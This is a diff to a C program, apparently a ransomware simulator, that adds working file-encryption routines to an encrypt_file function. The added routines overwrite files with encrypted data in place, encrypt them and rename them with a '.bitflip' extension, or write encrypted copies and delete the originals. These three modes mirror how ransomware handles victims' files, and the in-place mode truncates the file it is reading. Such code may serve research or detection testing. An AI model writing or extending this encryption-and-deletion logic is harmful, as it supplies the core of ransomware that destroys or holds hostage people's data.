@@ -2,7 +2,10 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <string.h>
 #include <signal.h>
+
+int MAX_FILENAME_LENGTH=256;
 
 typedef enum {
   NO_MODE,
@@ -42,7 +45,10 @@ int encrypt_file(crypt_mode_t mode, char *filename) {
   bool eof = false;
   char buf[2097152];
   fprintf(stderr, "Working on: %s\n", filename);
-//  newfilename = filename
+  char newfilename[MAX_FILENAME_LENGTH+1+8];
+  strncpy(newfilename, filename, MAX_FILENAME_LENGTH);
+  strcat(newfilename, ".bitflip");
+  fprintf(stderr, "New name: %s\n", newfilename);
   switch (mode) {
     case SEEK_MODE:
       fprintf(stderr, "Seek mode detected ...\n");
@@ -62,20 +68,45 @@ int encrypt_file(crypt_mode_t mode, char *filename) {
     case STEALTH_MODE:
       fprintf(stderr, "Stealth mode detected ...\n");
       fp_r = fopen(filename, "rb");
-/*      if (fp_r == NULL) return EXIT_FAILURE;
+      if (fp_r == NULL) return EXIT_FAILURE;
       fp_w = fopen(filename, "wb");
       if (fp_w == NULL) return EXIT_FAILURE;
-      while (!feof(fp_r)) {
-        fread(buf, sizeof(buf), 1, fp_r);
-        encrypt_buffer(buf, sizeof(buf));
-        fwrite(buf, sizeof(buf), 1, fp_w);
-      }*/
+      while (!eof) {
+        num_r = fread(buf, 1, sizeof(buf), fp_r);
+        encrypt_buffer(buf, sizeof(buf)/sizeof(buf[0]));
+        if (num_r < sizeof(buf)/sizeof(buf[0])) { eof = true; }
+        num_w = fwrite(buf, 1, num_r, fp_w);
+      }
     break;
     case RENAME_MODE:
       fprintf(stderr, "Rename mode detected ...\n");
+      fp_w = fopen(filename, "rb+");
+      if (fp_w == NULL) return EXIT_FAILURE;
+      while (!eof) {
+        num_r = fread(buf, 1, sizeof(buf), fp_w);
+        encrypt_buffer(buf, sizeof(buf)/sizeof(buf[0]));
+        fseek(fp_w, -num_r, SEEK_CUR);
+        if (num_r < sizeof(buf)/sizeof(buf[0])) { eof = true; }
+        num_w = fwrite(buf, 1, num_r, fp_w);
+        if (num_r != num_w ) {
+          fprintf(stderr, "Mismatched read and write!\n");
+        }
+      }
+    rename(filename, newfilename);
     break;
     case TRANSFER_MODE:
       fprintf(stderr, "Transfer mode detected ...\n");
+      fp_r = fopen(filename, "rb");
+      if (fp_r == NULL) return EXIT_FAILURE;
+      fp_w = fopen(newfilename, "wb");
+      if (fp_w == NULL) return EXIT_FAILURE;
+      while (!eof) {
+        num_r = fread(buf, 1, sizeof(buf), fp_r);
+        encrypt_buffer(buf, sizeof(buf)/sizeof(buf[0]));
+        if (num_r < sizeof(buf)/sizeof(buf[0])) { eof = true; }
+        num_w = fwrite(buf, 1, num_r, fp_w);
+      }
+    remove(filename);
     break;
   }
 
